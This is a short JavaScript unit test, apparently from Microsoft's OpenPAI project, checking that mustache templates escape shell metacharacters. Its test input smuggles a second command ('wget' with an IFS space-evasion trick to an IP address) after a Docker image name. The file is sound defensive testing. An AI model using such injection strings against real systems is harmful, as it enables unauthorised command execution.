// Copyright (c) Microsoft Corporation
// All rights reserved.
//
// MIT License
//
// Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated
// documentation files (the "Software"), to deal in the Software without restriction, including without limitation
// the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and
// to permit persons to whom the Software is furnished to do so, subject to the following conditions:
// The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED *AS IS*, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING
// BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
// NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM,
// DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

const assert = require('assert');
const mustache = require('mustache');

describe('Shell escaping in template', () => {
  it('should escape unsafe shell characters', () => {
    const input = 'pai.build.base:hadoop2.7.2-cuda8.0-cudnn6-devel-ubuntu16.04;wget ${IFS%?}172.23.232.125:3000';
    const actualOutput = mustache.render('{{ input }}\n{{{ input }}}', {input});
    const expectedOutput = [
      'pai.build.base:hadoop2.7.2-cuda8.0-cudnn6-devel-ubuntu16.04\\;wget\\ \\$\\{IFS%\\?\\}172.23.232.125:3000',
      'pai.build.base:hadoop2.7.2-cuda8.0-cudnn6-devel-ubuntu16.04;wget ${IFS%?}172.23.232.125:3000',
    ].join('\n');
    assert.strictEqual(actualOutput, expectedOutput);
  });
});
